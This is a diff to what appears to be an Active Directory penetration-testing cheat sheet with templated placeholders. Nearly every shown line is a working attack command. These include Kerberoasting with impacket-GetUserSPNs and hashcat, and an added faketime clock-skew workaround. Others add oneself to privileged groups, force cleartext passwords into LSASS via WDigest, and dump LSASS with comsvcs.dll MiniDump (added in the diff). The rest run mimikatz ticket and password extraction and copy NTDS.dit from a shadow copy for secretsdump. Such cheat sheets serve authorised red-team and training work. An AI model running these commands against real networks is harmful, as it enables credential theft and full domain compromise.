@@ -25,6 +25,7 @@
 impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}                       # list SPN accounts
 impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request              # roast all
 impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
+faketime "$(ntpdate -q {{DC_IP}} | head -n 1 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request 
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
@@ -176,7 +177,6 @@ Quick GenericAll on a group → add self (LOLBIN), then clean up:
 ```cmd
 net group "{{GROUP_NAME}}" {{USERNAME}} /add /domain
 net group "{{GROUP_NAME}}" {{USERNAME}} /del /domain
-
 Get-ADPrincipalGroupMembership -Identity "{{USERNAME}}" | Select-Object Name
 ```
 
@@ -270,11 +270,11 @@ sekurlsa::tickets                 # TGTs + TGSs in LSASS
 sekurlsa::tickets /export         # dump tickets to .kirbi files
 ```
 
-WDigest downgrade — force **cleartext** into LSASS for future logons (local admin; noisy — only when
-you specifically need plaintext, restore to `0` after):
+WDigest downgrade — force **cleartext** into LSASS for future logons (local admin; noisy — only when you specifically need plaintext, restore to `0` after):
 
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Tasks\lsass.dmp full 
 ```
 ```powershell
 .\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"   # after a privileged logon
@@ -491,7 +491,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 reg.exe save hklm\system c:\system.bak
 ```
 ```bash
-impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL  # Needs the system hive to work. 
 ```
 
 ---
